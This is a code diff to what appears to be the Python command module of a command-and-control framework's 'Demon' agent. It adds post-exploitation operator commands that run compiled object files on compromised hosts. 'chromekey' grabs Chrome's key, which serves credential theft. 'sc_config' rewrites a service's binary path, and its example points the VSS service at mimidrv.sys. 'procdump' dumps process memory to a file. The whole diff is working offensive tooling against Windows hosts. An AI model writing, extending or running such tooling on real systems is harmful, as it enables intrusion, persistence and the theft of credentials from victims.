@@ -103,6 +103,25 @@ def addusertogroup( demonID, *params ):
     demon.InlineExecute( TaskID, "go", f"bin/addusertogroup.{demon.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
+    
+def chromekey( demonID, *params ):
+    TaskID : str    = None
+    demon  : Demon  = None
+    packer = Packer()
+    demon  = Demon( demonID )
+
+    num_params = len(params)
+
+    if num_params > 1:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        return False
+
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to grab the chrome key" )
+
+    demon.InlineExecute( TaskID, "go", f"bin/chromeKey.{demon.ProcessArch}.o", packer.getbuffer(), False )
+
+    return TaskID
 
 def enableuser( demonID, *params ):
     TaskID : str    = None
@@ -463,6 +482,57 @@ def sc_create( demonID, *params ):
 
     return TaskID
 
+def sc_config( demonID, *params ):
+    TaskID : str    = None
+    demon  : Demon  = None
+    packer = Packer()
+    demon  = Demon( demonID )
+
+    num_params = len(params)
+    hostname   = ''
+
+    if num_params < 3:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
+        return False
+
+    if num_params > 5:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        return False
+
+    servicename = params[ 0 ]
+    binpath     = params[ 1 ]
+    errormode   = params[ 2 ]
+    startmode   = params[ 3 ]	
+    
+    if num_params == 5:
+        hostname = params[ 4 ]
+
+    try:
+        errormode = int( errormode )
+        assert errormode in [0, 1, 2, 3]
+    except Exception as e:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid errormode" )
+        return False
+
+    try:
+        startmode = int( startmode )
+        assert startmode in [2, 3, 4]
+    except Exception as e:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid startmode" )
+        return False
+
+    packer.addstr(hostname)
+    packer.addstr(servicename)
+    packer.addstr(binpath)
+    packer.addshort(errormode)
+    packer.addshort(startmode)
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to modify the {servicename} service" )
+
+    demon.InlineExecute( TaskID, "go", f"bin/sc_config.{demon.ProcessArch}.o", packer.getbuffer(), False )
+
+    return TaskID
+
 def sc_start( demonID, *params ):
     TaskID : str    = None
     demon  : Demon  = None
@@ -618,6 +688,36 @@ def adduser( demonID, *params ):
     demon.InlineExecute( TaskID, "go", f"bin/adduser.{demon.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
+    
+def procdump( demonID, *params ):
+    TaskID : str    = None
+    demon  : Demon  = None
+    packer = Packer()
+    demon  = Demon( demonID )
+
+    num_params = len(params)
+    PID = ''
+    OutFile = ''
+
+    if num_params < 1:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough parameters" )
+        return False
+
+    if num_params > 2:
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Too many parameters" )
+        return False
+
+    PID = params[ 0 ]
+    OutFile = params[ 1 ]
+
+    packer.addstr(PID)
+    packer.addstr(OutFile)
+
+    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to dump the process memory of the provided PID" )
+
+    demon.InlineExecute( TaskID, "go", f"bin/procdump.{demon.ProcessArch}.o", packer.getbuffer(), False )
+
+    return TaskID
 
 RegisterCommand( adcs_request, "", "adcs_request", "Request an enrollment certificate", 0, "/CA:ca [/TEMPLATE:template] [/SUBJECT:subject] [/ALTNAME:altname] [/INSTALL] [/MACHINE]", "1337 c:\\windwos\\temp\\test.txt" )
 RegisterCommand( addusertogroup, "", "addusertogroup", "Add the specified user to the specified group", 0, """<USERNAME> <GROUPNAME> <Server> <DOMAIN>
@@ -627,6 +727,7 @@ RegisterCommand( addusertogroup, "", "addusertogroup", "Add the specified user t
          DOMAIN     Required. The domain/computer for the account. You must give 
                     the domain name for the user if it is a domain account, or
                     use \"\" to target an account on the local machine.""", "eviluser Administrators \"\" \"\"" )
+RegisterCommand( chromekey, "", "chromekey", "Grabs chrome key", 0, """chromekey""", "chromekey" )
 RegisterCommand( enableuser, "", "enableuser", "Activates (and if necessary enables) the specified user account on the target computer.", 0, """<USERNAME> <HOSTNAME>
          USERNAME  Required. The user name to activate/enable. 
          HOSTNAME  Required. The domain/computer for the account. You must give 
@@ -659,8 +760,7 @@ RegisterCommand( reg_save, "", "reg_save", "Saves the registry path and all subk
                     HKU
                     HKCR
          REGPATH  Required. The registry path to save.
-         FILEOUT  Required. The output file. 
-Note:    The FILEOUT is saved to disk on target, so don't forget to clean up.""", "HKLM Some\\Path c:\\windows\\temp\\reg.txt" )
+         FILEOUT  Required. The output file. Note:    The FILEOUT is saved to disk on target, so don't forget to clean up.""", "HKLM Some\\Path c:\\windows\\temp\\reg.txt" )
 RegisterCommand( reg_set, "", "reg_set", "This command creates or sets the specified registry key (or value) on the target host.", 0, """<OPT:HOSTNAME> <HIVE> <REGPATH> <KEY> <TYPE> <DATA>
          HOSTNAME Optional. The host to connect to and run the commnad on.
          HIVE     Required. The registry hive containing the REGPATH. Possible 
@@ -709,6 +809,22 @@ RegisterCommand( sc_create, "", "sc_create", "This command creates a service on 
                       4 - SERVICE_WIN32_SHARE_PROCESS (Service that shares a process with one or more other services)
          HOSTNAME     Optional. The host to connect to and run the commnad on. The
                       local system is targeted if a HOSTNAME is not specified.""", "mimidrv mimidrv C:\\Windows\\Temp\\mimidrv.sys \"\" 0 3 2" )
+RegisterCommand( sc_config, "", "sc_config", "This command modifies a service on the target host.", 0, """<SVCNAME> <BINPATH> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>
+         SVCNAME      Required. The name of the service to create.
+         BINPATH      Required. The binary path of the service to execute.
+         ERRORMODE    Required. The error mode of the service. The valid
+                      options are:
+                        0 - ignore errors
+                        1 - normal logging
+                        2 - log severe errors
+                        3 - log critical errors
+         STARTMODE    Required. The start mode for the service. The valid
+                      options are:
+                        2 - auto start
+                        3 - on demand start
+                        4 - disabled
+         HOSTNAME     Optional. The host to connect to and run the commnad on. The
+                      local system is targeted if a HOSTNAME is not specified.""", "VSS  C:\\Windows\\Temp\\mimidrv.sys 0 3 " )
 RegisterCommand( sc_start, "", "sc_start", "This command starts the specified service on the target host.", 0, """<SVCNAME> <OPT:HOSTNAME>
          SVCNAME  Required. The name of the service to start.
          HOSTNAME Optional. The host to connect to and run the command on. The
@@ -731,3 +847,6 @@ RegisterCommand( adduser, "", "adduser", "Add a new user to a machine.", 0, """<
          PASSWORD   Required. The password of the new user. 
          SERVER     Optional. If entered, the user will be created on that machine. If not, the
                     local machine will be used.""", "eviluser Password123 dc01.contoso.local" )
+RegisterCommand( procdump, "", "procdump", "Dump the specified process to the specified output file", 0, """<PID> <OUTFILE>
+         PID        Required. PID of process to dump. 
+         OUTFILE    Required. Location and name of output file.""", "<PID> <OUTFILE>")
